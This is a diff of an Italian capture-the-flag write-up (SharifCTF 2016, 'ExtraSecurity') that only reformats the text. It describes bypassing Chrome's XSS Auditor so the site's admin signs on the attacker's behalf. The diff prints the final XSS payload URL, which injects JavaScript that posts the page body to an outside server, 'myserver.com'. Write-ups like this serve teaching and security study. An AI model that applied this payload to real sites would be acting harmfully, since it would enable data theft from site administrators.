@@ -11,7 +11,7 @@ Questa sfida web richiedeva di fare 'firmare' all'utente amministratore del sito
 
 ![L'homepage della challenge](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_1.png)
 
-veniva offerta la possibilità di firmare con la propria chiave (impostata dal server in un cookie 'KEY') o di richiedere all'amministratore attraverso un form di effettuare la firma per noi. Dal testo non era chiaro quale fosse esattamente la strada da prendere: se fosse necessario rubare il cookie all'admin o se bastasse effettivamente utilizzare il form con qualche modifica.
+veniva offerta la possibilità di firmare con la propria chiave (impostata dal server in un cookie `KEY`) o di richiedere all'amministratore attraverso un form di effettuare la firma per noi. Dal testo non era chiaro quale fosse esattamente la strada da prendere: se fosse necessario rubare il cookie all'admin o se bastasse effettivamente utilizzare il form con qualche modifica.
 Il testo specificava esplicitamente che l'admin avrebbe utilizzato Chrome per vedere le richieste e che quindi sarebbe intervenuto l'XSS Auditor.
 
 Il primo problema consisteva nel fatto che nella propria pagina per effettuare la firma, all'invio del form, veniva visualizzato un popup di errore e si veniva reindirizzati prima di qualsiasi altra azione.
@@ -93,7 +93,9 @@ Una volta scoperto che effettivamente il filtro falliva a processare qualsiasi c
 
 Il payload finale quindi consisteva in:
 
-`http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>'};%0a/*%2500*/%0apostForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"&content=1`
+```
+http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>'};%0a/*%2500*/%0apostForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"&content=1
+```
 
 Che risulta nel seguente codice:
 
